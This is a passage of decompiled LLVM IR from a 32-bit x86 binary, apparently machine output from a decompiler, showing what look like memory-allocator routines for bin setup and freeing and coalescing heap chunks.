  %v3_804c0d5 = inttoptr i32 %v2_804c0d5 to i32*
  store i32 %v0_804c0d5, i32* %v3_804c0d5, align 4
  store i32 %v1_804c00e, i32* %eax.global-to-local, align 4
  %v0_804c0dc = load i32, i32* @edx, align 4
  %v1_804c0dc = load i32, i32* @ecx, align 4
  %v2_804c0dc = add i32 %v1_804c0dc, 8
  %v3_804c0dc = inttoptr i32 %v2_804c0dc to i32*
  store i32 %v0_804c0dc, i32* %v3_804c0dc, align 4
  %v0_804c0df = load i32, i32* @edi, align 4
  %v1_804c0df = load i32, i32* @ecx, align 4
  %v3_804c0df = add i32 %v1_804c0df, %v0_804c0df
  %v4_804c0df = inttoptr i32 %v3_804c0df to i32*
  store i32 %v0_804c0df, i32* %v4_804c0df, align 4
  %v0_804c0e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0e2 = load i32, i32* @ecx, align 4
  %v2_804c0e2 = add i32 %v1_804c0e2, 12
  %v3_804c0e2 = inttoptr i32 %v2_804c0e2 to i32*
  store i32 %v0_804c0e2, i32* %v3_804c0e2, align 4
  br label %dec_label_pc_804c0f7

dec_label_pc_804c0e7:                             ; preds = %dec_label_pc_804c086
  %v0_804c0e7 = load i32, i32* @edi, align 4
  %v2_804c0e7 = add i32 %v0_804c0e7, %v1_804c08e
  %v1_804c0ea = or i32 %v2_804c0e7, 1
  store i32 %v1_804c0ea, i32* %eax.global-to-local, align 4
  %v1_804c0ed = load i32, i32* @ecx, align 4
  %v2_804c0ed = add i32 %v1_804c0ed, 4
  %v3_804c0ed = inttoptr i32 %v2_804c0ed to i32*
  store i32 %v1_804c0ea, i32* %v3_804c0ed, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_804c0f4 = load i32, i32* @ecx, align 4
  store i32 %v0_804c0f4, i32* %v3_804c0f4, align 4
  br label %dec_label_pc_804c0f7

dec_label_pc_804c0f7:                             ; preds = %dec_label_pc_804c0c3, %dec_label_pc_804c0e7
  store i32 %v3_804c049, i32* @ecx, align 4
  %v1_804c0fb = icmp eq i32 %v3_804c049, 0
  %v1_804c0fd = icmp eq i1 %v1_804c0fb, false
  br i1 %v1_804c0fd, label %dec_label_pc_804c049, label %dec_label_pc_804c103

dec_label_pc_804c103:                             ; preds = %dec_label_pc_804c0f7, %dec_label_pc_804c035
  store i32 %v4_804c02d, i32* @ecx, align 4
  %v15_804c107 = icmp eq i32 %v0_804c043, %v4_804c02d
  br i1 %v15_804c107, label %dec_label_pc_804c18b, label %dec_label_pc_804c10d

dec_label_pc_804c10d:                             ; preds = %dec_label_pc_804c103
  %v4_804c10d = add i32 %v0_804c043, 4
  br label %dec_label_pc_804c035

dec_label_pc_804c117:                             ; preds = %dec_label_pc_804c117.lr.ph, %dec_label_pc_804c117
  %v1_804c11b = phi i32 [ 1, %dec_label_pc_804c117.lr.ph ], [ %v0_804c126, %dec_label_pc_804c117 ]
  %v2_804c11b = mul i32 %v1_804c11b, 8
  %v4_804c11b = add i32 %v3_804c11b, %v2_804c11b
  store i32 %v4_804c11b, i32* %eax.global-to-local, align 4
  %v1_804c11f = add i32 %v1_804c11b, 1
  store i32 %v1_804c11f, i32* %edx.global-to-local, align 4
  %v2_804c120 = add i32 %v4_804c11b, 12
  %v3_804c120 = inttoptr i32 %v2_804c120 to i32*
  store i32 %v4_804c11b, i32* %v3_804c120, align 4
  %v0_804c123 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c123 = add i32 %v0_804c123, 8
  %v3_804c123 = inttoptr i32 %v2_804c123 to i32*
  store i32 %v0_804c123, i32* %v3_804c123, align 4
  %v0_804c126 = load i32, i32* %edx.global-to-local, align 4
  %v7_804c129 = icmp sgt i32 %v0_804c126, 95
  br i1 %v7_804c129, label %dec_label_pc_804c12b, label %dec_label_pc_804c117

dec_label_pc_804c12b:                             ; preds = %dec_label_pc_804c117
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_804c12f = add i32 %tmp20, 864
  %v2_804c12f = inttoptr i32 %v1_804c12f to i32*
  %v3_804c12f = load i32, i32* %v2_804c12f, align 4
  %v4_804c12f = or i32 %v3_804c12f, 1
  store i32 %v4_804c12f, i32* %v2_804c12f, align 4
  %v0_804c136 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c136 = add i32 %v0_804c136, 840
  %v2_804c136 = inttoptr i32 %v1_804c136 to i32*
  store i32 0, i32* %v2_804c136, align 4
  %v0_804c140 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c140 = add i32 %v0_804c140, 852
  %v2_804c140 = inttoptr i32 %v1_804c140 to i32*
  store i32 65536, i32* %v2_804c140, align 4
  %v0_804c14a = load i32, i32* %eax.global-to-local, align 4
  %v1_804c14a = add i32 %v0_804c14a, 844
  %v2_804c14a = inttoptr i32 %v1_804c14a to i32*
  store i32 262144, i32* %v2_804c14a, align 4
  %v0_804c154 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c154 = add i32 %v0_804c154, 836
  %v2_804c154 = inttoptr i32 %v1_804c154 to i32*
  store i32 262144, i32* %v2_804c154, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_804c165 = load i32, i32* %arg1, align 4
  %v1_804c167 = urem i32 %v2_804c165, 4
  %v1_804c16a = or i32 %v1_804c167, 72
  store i32 %v1_804c16a, i32* %arg1, align 4
  %v0_804c16f = load i32, i32* @edx, align 4
  %v1_804c171 = add i32 %v0_804c16f, 52
  store i32 %v1_804c171, i32* %eax.global-to-local, align 4
  %v2_804c174 = add i32 %v0_804c16f, 44
  %v3_804c174 = inttoptr i32 %v2_804c174 to i32*
  store i32 %v1_804c171, i32* %v3_804c174, align 4
  %v1_804c179 = call i32 @function_804c630(i32 30)
  store i32 %v1_804c179, i32* %eax.global-to-local, align 4
  store i32 %tmp20, i32* @ecx, align 4
  %v2_804c185 = add i32 %tmp20, 860
  %v3_804c185 = inttoptr i32 %v2_804c185 to i32*
  store i32 %v1_804c179, i32* %v3_804c185, align 4
  br label %dec_label_pc_804c18b

dec_label_pc_804c18b:                             ; preds = %dec_label_pc_804c103, %dec_label_pc_804c12b
  store i32 %v0_804bfee, i32* @ebx, align 4
  store i32 %v0_804bfed, i32* @esi, align 4
  store i32 %v0_804bfec, i32* @edi, align 4
  %v0_804c192 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804c192

; uselistorder directives
  uselistorder i32 %v0_804c126, { 1, 0 }
  uselistorder i32 %v0_804c123, { 1, 0 }
  uselistorder i32 %v1_804c11b, { 1, 0 }
  uselistorder i32 %v0_804c0df, { 1, 0 }
  uselistorder i32 %v1_804c09d, { 1, 0 }
  uselistorder i32 %v2_804c096, { 1, 0 }
  uselistorder i32 %v1_804c08e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c09a, { 1, 0 }
  uselistorder i32 %v3_804c049, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804c066, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804c043, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804c0f4, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804c18b, { 1, 0 }
  uselistorder label %dec_label_pc_804c117, { 1, 0 }
  uselistorder label %dec_label_pc_804c0f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c0c3, { 1, 0 }
  uselistorder label %dec_label_pc_804c0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804c086, { 1, 0 }
}

define i32 @function_804c193(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c193:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804c193 = load i32, i32* @ebp, align 4
  %v0_804c194 = load i32, i32* @edi, align 4
  %v0_804c195 = load i32, i32* @esi, align 4
  %v0_804c196 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804c19e = icmp eq i32 %arg1, 0
  br i1 %v1_804c19e, label %dec_label_pc_804c327, label %dec_label_pc_804c1a6

dec_label_pc_804c1a6:                             ; preds = %dec_label_pc_804c193
  %v2_804c1b1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c1b1, i32* @eax, align 4
  %v2_804c1b6 = call i32 @function_804c7b7(i32 %v2_804c1b1, i32 134530996)
  store i32 %v2_804c1b6, i32* %eax.global-to-local, align 4
  %v1_804c1c2 = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f608.78 to i32))
  %v1_804c1c7 = add i32 %arg1, -8
  store i32 %v1_804c1c7, i32* @ecx, align 4
  %v0_804c1ca = load i8, i8* @global_var_804f760.79, align 1
  %v1_804c1ca = sext i8 %v0_804c1ca to i32
  store i32 %v1_804c1ca, i32* %eax.global-to-local, align 4
  %v1_804c1cf = add i32 %arg1, -4
  %v2_804c1cf = inttoptr i32 %v1_804c1cf to i32*
  %v3_804c1cf = load i32, i32* %v2_804c1cf, align 4
  store i32 %v3_804c1cf, i32* %edx.global-to-local, align 4
  %v1_804c1d7 = and i32 %v3_804c1cf, -4
  %v4_804c1d7 = trunc i32 %v1_804c1d7 to i8
  store i32 %v1_804c1d7, i32* @ebx, align 4
  %v8_804c1dc = icmp ugt i8 %v4_804c1d7, %v0_804c1ca
  br i1 %v8_804c1dc, label %dec_label_pc_804c1fe, label %dec_label_pc_804c1de

dec_label_pc_804c1de:                             ; preds = %dec_label_pc_804c1a6
  %v1_804c1de = or i32 %v1_804c1ca, 3
  store i32 %v1_804c1de, i32* %eax.global-to-local, align 4
  %v2_804c1e1 = udiv i32 %v3_804c1cf, 8
  %v1_804c1e4 = trunc i32 %v1_804c1de to i8
  store i8 %v1_804c1e4, i8* @global_var_804f760.79, align 32
  %v1_804c1e9 = mul nuw i32 %v2_804c1e1, 4
  %v2_804c1e9 = add i32 %v1_804c1e9, ptrtoint (i8* @global_var_804f760.79 to i32)
  store i32 %v2_804c1e9, i32* %edx.global-to-local, align 4
  %v1_804c1f0 = add i32 %v1_804c1e9, add (i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32 -4)
  %v2_804c1f0 = inttoptr i32 %v1_804c1f0 to i32*
  %v3_804c1f0 = load i32, i32* %v2_804c1f0, align 4
  store i32 %v3_804c1f0, i32* %eax.global-to-local, align 4
  %v3_804c1f3 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804c1f0, i32* %v3_804c1f3, align 4
  %v0_804c1f6 = load i32, i32* @ecx, align 4
  %v1_804c1f6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c1f6 = add i32 %v1_804c1f6, -4
  %v3_804c1f6 = inttoptr i32 %v2_804c1f6 to i32*
  store i32 %v0_804c1f6, i32* %v3_804c1f6, align 4
  br label %dec_label_pc_804c316

dec_label_pc_804c1fe:                             ; preds = %dec_label_pc_804c1a6
  %v2_804c1fe = and i32 %v3_804c1cf, 2
  %v3_804c1fe = icmp eq i32 %v2_804c1fe, 0
  %v1_804c201 = icmp eq i1 %v3_804c1fe, false
  br i1 %v1_804c201, label %dec_label_pc_804c2f6, label %dec_label_pc_804c207

dec_label_pc_804c207:                             ; preds = %dec_label_pc_804c1fe
  %v1_804c207 = or i32 %v1_804c1ca, 1
  %v3_804c207 = trunc i32 %v1_804c207 to i8
  store i32 %v1_804c207, i32* %eax.global-to-local, align 4
  store i8 %v3_804c207, i8* @global_var_804f760.79, align 32
  %v2_804c20f = add i32 %v1_804c1d7, %v1_804c1c7
  store i32 %v2_804c20f, i32* @esi, align 4
  %v1_804c212 = add i32 %v2_804c20f, 4
  %v2_804c212 = inttoptr i32 %v1_804c212 to i32*
  %v3_804c212 = load i32, i32* %v2_804c212, align 4
  store i32 %v3_804c212, i32* %eax.global-to-local, align 4
  %v2_804c219 = inttoptr i32 %v1_804c1cf to i8*
  %v3_804c219 = load i8, i8* %v2_804c219, align 1
  %v4_804c219 = urem i8 %v3_804c219, 2
  %v5_804c219 = icmp eq i8 %v4_804c219, 0
  %v1_804c21d = icmp eq i1 %v5_804c219, false
  br i1 %v1_804c21d, label %dec_label_pc_804c240, label %dec_label_pc_804c21f

dec_label_pc_804c21f:                             ; preds = %dec_label_pc_804c207
  %v2_804c21f = inttoptr i32 %v1_804c1c7 to i32*
  %v3_804c21f = load i32, i32* %v2_804c21f, align 4
  store i32 %v3_804c21f, i32* @ebp, align 4
  %v2_804c224 = sub i32 %v1_804c1c7, %v3_804c21f
  store i32 %v2_804c224, i32* %eax.global-to-local, align 4
  %v1_804c226 = add i32 %v2_804c224, 8
  %v2_804c226 = inttoptr i32 %v1_804c226 to i32*
  %v3_804c226 = load i32, i32* %v2_804c226, align 4
  store i32 %v3_804c226, i32* @edi, align 4
  %v1_804c229 = add i32 %v2_804c224, 12
  %v2_804c229 = inttoptr i32 %v1_804c229 to i32*
  %v3_804c229 = load i32, i32* %v2_804c229, align 4
  store i32 %v3_804c229, i32* %edx.global-to-local, align 4
  %v1_804c22c = add i32 %v3_804c226, 12
  %v2_804c22c = inttoptr i32 %v1_804c22c to i32*
  %v3_804c22c = load i32, i32* %v2_804c22c, align 4
  store i32 %v3_804c22c, i32* @ecx, align 4
  %v12_804c22f = icmp eq i32 %v3_804c22c, %v2_804c224
  %v1_804c231 = icmp eq i1 %v12_804c22f, false
  br i1 %v1_804c231, label %dec_label_pc_804c26f, label %dec_label_pc_804c233

dec_label_pc_804c233:                             ; preds = %dec_label_pc_804c21f
  %v1_804c233 = add i32 %v3_804c229, 8
  %v2_804c233 = inttoptr i32 %v1_804c233 to i32*
  %v3_804c233 = load i32, i32* %v2_804c233, align 4
  %v15_804c233 = icmp eq i32 %v3_804c233, %v3_804c22c
  %v1_804c236 = icmp eq i1 %v15_804c233, false
  br i1 %v1_804c236, label %dec_label_pc_804c26f, label %dec_label_pc_804c238

dec_label_pc_804c238:                             ; preds = %dec_label_pc_804c233
  %v2_804c238 = add i32 %v3_804c21f, %v1_804c1d7
  store i32 %v2_804c238, i32* @ebx, align 4
  store i32 %v3_804c229, i32* %v2_804c22c, align 4
  %v0_804c23d = load i32, i32* @edi, align 4
  %v1_804c23d = load i32, i32* %edx.global-to-local, align 4
  %v2_804c23d = add i32 %v1_804c23d, 8
  %v3_804c23d = inttoptr i32 %v2_804c23d to i32*
  store i32 %v0_804c23d, i32* %v3_804c23d, align 4
  %v0_804c247.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c240

dec_label_pc_804c240:                             ; preds = %dec_label_pc_804c207, %dec_label_pc_804c238
  %v1_804c253 = phi i32 [ %v2_804c20f, %dec_label_pc_804c207 ], [ %v0_804c247.pre, %dec_label_pc_804c238 ]
  %v1_804c244 = and i32 %v3_804c212, -4
  store i32 %v1_804c244, i32* @ebp, align 4
  %v1_804c247 = load i32, i32* @global_var_804f78c.80, align 4
  %v12_804c247 = icmp eq i32 %v1_804c253, %v1_804c247
  br i1 %v12_804c247, label %dec_label_pc_804c2a1, label %dec_label_pc_804c24f

dec_label_pc_804c24f:                             ; preds = %dec_label_pc_804c240
  %v2_804c24f = add i32 %v1_804c253, 4
  %v3_804c24f = add i32 %v2_804c24f, %v1_804c244
  %v4_804c24f = inttoptr i32 %v3_804c24f to i32*
  %v5_804c24f = load i32, i32* %v4_804c24f, align 4
  store i32 %v5_804c24f, i32* %eax.global-to-local, align 4
  %v3_804c253 = inttoptr i32 %v2_804c24f to i32*
  store i32 %v1_804c244, i32* %v3_804c253, align 4
  %v0_804c256 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c256 = urem i32 %v0_804c256, 2
  %v2_804c256 = icmp eq i32 %v1_804c256, 0
  store i32 %v1_804c256, i32* %eax.global-to-local, align 4
  %v1_804c25b = icmp eq i1 %v2_804c256, false
  br i1 %v1_804c25b, label %dec_label_pc_804c27c, label %dec_label_pc_804c25d

dec_label_pc_804c25d:                             ; preds = %dec_label_pc_804c24f
  %v0_804c25d = load i32, i32* @esi, align 4
  %v1_804c25d = add i32 %v0_804c25d, 8
  %v2_804c25d = inttoptr i32 %v1_804c25d to i32*
  %v3_804c25d = load i32, i32* %v2_804c25d, align 4
  store i32 %v3_804c25d, i32* @edx, align 4
  %v1_804c260 = add i32 %v0_804c25d, 12
  %v2_804c260 = inttoptr i32 %v1_804c260 to i32*
  %v3_804c260 = load i32, i32* %v2_804c260, align 4
  store i32 %v3_804c260, i32* %eax.global-to-local, align 4
  %v1_804c263 = add i32 %v3_804c25d, 12
  %v2_804c263 = inttoptr i32 %v1_804c263 to i32*
  %v3_804c263 = load i32, i32* %v2_804c263, align 4
  store i32 %v3_804c263, i32* @edi, align 4
  %v12_804c266 = icmp eq i32 %v3_804c263, %v0_804c25d
  %v1_804c268 = icmp eq i1 %v12_804c266, false
  br i1 %v1_804c268, label %dec_label_pc_804c26f, label %dec_label_pc_804c26a

dec_label_pc_804c26a:                             ; preds = %dec_label_pc_804c25d
  %v1_804c26a = add i32 %v3_804c260, 8
  %v2_804c26a = inttoptr i32 %v1_804c26a to i32*
  %v3_804c26a = load i32, i32* %v2_804c26a, align 4
  %v15_804c26a = icmp eq i32 %v3_804c26a, %v3_804c263
  br i1 %v15_804c26a, label %dec_label_pc_804c274, label %dec_label_pc_804c26f

dec_label_pc_804c26f:                             ; preds = %dec_label_pc_804c26a, %dec_label_pc_804c25d, %dec_label_pc_804c233, %dec_label_pc_804c21f
  %v0_804c26f = call i32 @function_804c32f()
  store i32 %v0_804c26f, i32* %eax.global-to-local, align 4
  %v1_804c274.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c274

dec_label_pc_804c274:                             ; preds = %dec_label_pc_804c26a, %dec_label_pc_804c26f
  %v1_804c274 = phi i32 [ %v3_804c25d, %dec_label_pc_804c26a ], [ %v1_804c274.pre, %dec_label_pc_804c26f ]
  %v0_804c274 = phi i32 [ %v3_804c260, %dec_label_pc_804c26a ], [ %v0_804c26f, %dec_label_pc_804c26f ]
  %v2_804c274 = add i32 %v1_804c274, 12
  %v3_804c274 = inttoptr i32 %v2_804c274 to i32*
  store i32 %v0_804c274, i32* %v3_804c274, align 4
  %v0_804c277 = load i32, i32* @ebx, align 4
  %v1_804c277 = load i32, i32* @ebp, align 4
  %v2_804c277 = add i32 %v1_804c277, %v0_804c277
  store i32 %v2_804c277, i32* @ebx, align 4
  %v0_804c279 = load i32, i32* @edx, align 4
  %v1_804c279 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c279 = add i32 %v1_804c279, 8
  %v3_804c279 = inttoptr i32 %v2_804c279 to i32*
  store i32 %v0_804c279, i32* %v3_804c279, align 4
  br label %dec_label_pc_804c27c

dec_label_pc_804c27c:                             ; preds = %dec_label_pc_804c24f, %dec_label_pc_804c274
  %v0_804c27c = load i32, i32* @global_var_804f79c.98, align 4
  store i32 %v0_804c27c, i32* %eax.global-to-local, align 4
  %v0_804c281 = load i32, i32* @ecx, align 4
  %v1_804c281 = add i32 %v0_804c281, 12
  %v2_804c281 = inttoptr i32 %v1_804c281 to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804c281, align 4
  %v0_804c288 = load i32, i32* @ebx, align 4
  %v1_804c288 = load i32, i32* @ecx, align 4
  %v3_804c288 = add i32 %v1_804c288, %v0_804c288
  %v4_804c288 = inttoptr i32 %v3_804c288 to i32*
  store i32 %v0_804c288, i32* %v4_804c288, align 4
  %v0_804c28b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c28b = load i32, i32* @ecx, align 4
  %v2_804c28b = add i32 %v1_804c28b, 8
  %v3_804c28b = inttoptr i32 %v2_804c28b to i32*
  store i32 %v0_804c28b, i32* %v3_804c28b, align 4
  %v0_804c28e = load i32, i32* @ecx, align 4
  %v1_804c28e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c28e = add i32 %v1_804c28e, 12
  %v3_804c28e = inttoptr i32 %v2_804c28e to i32*
  store i32 %v0_804c28e, i32* %v3_804c28e, align 4
  %v0_804c291 = load i32, i32* @ebx, align 4
  %v1_804c293 = or i32 %v0_804c291, 1
  store i32 %v1_804c293, i32* %eax.global-to-local, align 4
  %v0_804c296 = load i32, i32* @ecx, align 4
  store i32 %v0_804c296, i32* @global_var_804f79c.98, align 4
  %v2_804c29c = add i32 %v0_804c296, 4
  %v3_804c29c = inttoptr i32 %v2_804c29c to i32*
  store i32 %v1_804c293, i32* %v3_804c29c, align 4
  br label %dec_label_pc_804c2b1

dec_label_pc_804c2a1:                             ; preds = %dec_label_pc_804c240
  %v0_804c2a1 = load i32, i32* @ebx, align 4
  %v2_804c2a1 = add i32 %v0_804c2a1, %v1_804c244
  store i32 %v2_804c2a1, i32* @ebx, align 4
  %v1_804c2a5 = or i32 %v2_804c2a1, 1
  store i32 %v1_804c2a5, i32* %eax.global-to-local, align 4
  %v1_804c2a8 = load i32, i32* @ecx, align 4
  %v2_804c2a8 = add i32 %v1_804c2a8, 4
  %v3_804c2a8 = inttoptr i32 %v2_804c2a8 to i32*
  store i32 %v1_804c2a5, i32* %v3_804c2a8, align 4
  %v0_804c2ab = load i32, i32* @ecx, align 4
  store i32 %v0_804c2ab, i32* @global_var_804f78c.80, align 4
  br label %dec_label_pc_804c2b1

dec_label_pc_804c2b1:                             ; preds = %dec_label_pc_804c27c, %dec_label_pc_804c2a1
  %v0_804c2b1 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804c2b1, 131072
  br i1 %tmp21, label %dec_label_pc_804c316, label %dec_label_pc_804c2b9

dec_label_pc_804c2b9:                             ; preds = %dec_label_pc_804c2b1
  %v0_804c2b9 = load i8, i8* @global_var_804f760.79, align 32
  %v1_804c2b9 = and i8 %v0_804c2b9, 2
  %v2_804c2b9 = icmp eq i8 %v1_804c2b9, 0
  br i1 %v2_804c2b9, label %dec_label_pc_804c2d2, label %dec_label_pc_804c2c2

dec_label_pc_804c2c2:                             ; preds = %dec_label_pc_804c2b9
  %v2_804c2ca = call i32 @function_804bfeb(i32* bitcast (i8* @global_var_804f760.79 to i32*))
  store i32 %v2_804c2ca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c2d2

dec_label_pc_804c2d2:                             ; preds = %dec_label_pc_804c2b9, %dec_label_pc_804c2c2
  %v0_804c2d2 = load i32, i32* @global_var_804f78c.80, align 4
  store i32 %v0_804c2d2, i32* %eax.global-to-local, align 4
  %v1_804c2d7 = add i32 %v0_804c2d2, 4
  %v2_804c2d7 = inttoptr i32 %v1_804c2d7 to i32*
  %v3_804c2d7 = load i32, i32* %v2_804c2d7, align 4
  %v1_804c2da = and i32 %v3_804c2d7, -4
  store i32 %v1_804c2da, i32* %eax.global-to-local, align 4
  %v1_804c2dd = load i32, i32* @global_var_804faa4.96, align 4
  %v7_804c2dd = icmp ult i32 %v1_804c2da, %v1_804c2dd
  br i1 %v7_804c2dd, label %dec_label_pc_804c316, label %dec_label_pc_804c2e5

dec_label_pc_804c2e5:                             ; preds = %dec_label_pc_804c2d2
  %v0_804c2e5 = load i32, i32* @global_var_804faa8.94, align 8
  store i32 %v0_804c2e5, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32* @edx, align 4
  %v0_804c2ef = call i32 @function_804bf5e()
  store i32 %v0_804c2ef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c316

dec_label_pc_804c2f6:                             ; preds = %dec_label_pc_804c1fe
  %v2_804c2f6 = inttoptr i32 %v1_804c1c7 to i32*
  %v3_804c2f6 = load i32, i32* %v2_804c2f6, align 4
  store i32 %v3_804c2f6, i32* %edx.global-to-local, align 4
  %v0_804c2f9 = load i32, i32* @global_var_804fab0.87, align 16
  %v1_804c2f9 = add i32 %v0_804c2f9, -1
  store i32 %v1_804c2f9, i32* @global_var_804fab0.87, align 16
  %v2_804c2ff = add i32 %v3_804c2f6, %v1_804c1d7
  store i32 %v2_804c2ff, i32* %eax.global-to-local, align 4
  %v2_804c302 = sub i32 %v1_804c1c7, %v3_804c2f6
  %v0_804c308 = load i32, i32* @global_var_804fac4.91, align 4
  %v2_804c308 = sub i32 %v0_804c308, %v2_804c2ff
  store i32 %v2_804c308, i32* @global_var_804fac4.91, align 4
  %v4_804c30e = inttoptr i32 %v2_804c302 to i32*
  %v5_804c30e = call i32 @function_804ce80(i32* %v4_804c30e, i32 %v2_804c2ff, i32 %v1_804c1d7, i32 %v1_804c1d7)
  store i32 %v5_804c30e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c316

dec_label_pc_804c316:                             ; preds = %dec_label_pc_804c2d2, %dec_label_pc_804c2b1, %dec_label_pc_804c2e5, %dec_label_pc_804c1de, %dec_label_pc_804c2f6
  store i32 %v2_804c1b1, i32* @eax, align 4
  %v2_804c31f = call i32 @function_804c7b7(i32 %v2_804c1b1, i32 1)
  store i32 %v2_804c31f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c327

dec_label_pc_804c327:                             ; preds = %dec_label_pc_804c193, %dec_label_pc_804c316
  %.0 = phi i32 [ undef, %dec_label_pc_804c193 ], [ %v2_804c31f, %dec_label_pc_804c316 ]
  store i32 %v0_804c196, i32* @ebx, align 4
  store i32 %v0_804c195, i32* @esi, align 4
  store i32 %v0_804c194, i32* @edi, align 4
  store i32 %v0_804c193, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804c2f6, { 1, 0, 2 }
  uselistorder i32 %v0_804c288, { 1, 0 }
  uselistorder i32 %v1_804c256, { 1, 0 }
  uselistorder i32 %v2_804c24f, { 1, 0 }
  uselistorder i32 %v1_804c244, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c253, { 1, 0 }
  uselistorder i32 %v1_804c1d7, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804c1cf, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c1c7, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_804f760.79 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_804f794.82 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_804f78c.80, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 ptrtoint (i8* @global_var_804f760.79 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_804f760.79, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804c327, { 1, 0 }
  uselistorder label %dec_label_pc_804c316, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804c2d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c2b1, { 1, 0 }
  uselistorder label %dec_label_pc_804c27c, { 1, 0 }
  uselistorder label %dec_label_pc_804c274, { 1, 0 }
  uselistorder label %dec_label_pc_804c240, { 1, 0 }
}

define i32 @function_804c32f() local_unnamed_addr {
dec_label_pc_804c34a.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804c33b = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f620.99 to i32))
  %v12_804c345 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_804c34a48 = add i32 %v12_804c345, 276
  %v5_804c34a49 = inttoptr i32 %v4_804c34a48 to i32*
  store i32 0, i32* %v5_804c34a49, align 4
  %v0_804c35550 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c35551 = add i32 %v0_804c35550, -1
  %v9_804c35552 = icmp slt i32 %v1_804c35551, 0
  store i32 %v1_804c35551, i32* %eax.global-to-local, align 4
  %v1_804c35653 = icmp eq i1 %v9_804c35552, false
  br i1 %v1_804c35653, label %dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge, label %dec_label_pc_804c358

dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge: ; preds = %dec_label_pc_804c34a.lr.ph, %dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge
  %v1_804c35554 = phi i32 [ %v1_804c355, %dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge ], [ %v1_804c35551, %dec_label_pc_804c34a.lr.ph ]
  %v0_804c34a.pre = load i32, i32* @esp, align 4
  %v2_804c34a = mul i32 %v1_804c35554, 4
  %v3_804c34a = add i32 %v0_804c34a.pre, 152
  %v4_804c34a = add i32 %v3_804c34a, %v2_804c34a
  %v5_804c34a = inttoptr i32 %v4_804c34a to i32*
  store i32 0, i32* %v5_804c34a, align 4
  %v0_804c355 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c355 = add i32 %v0_804c355, -1
  %v9_804c355 = icmp slt i32 %v1_804c355, 0
  store i32 %v1_804c355, i32* %eax.global-to-local, align 4
  %v1_804c356 = icmp eq i1 %v9_804c355, false
  br i1 %v1_804c356, label %dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge, label %dec_label_pc_804c358

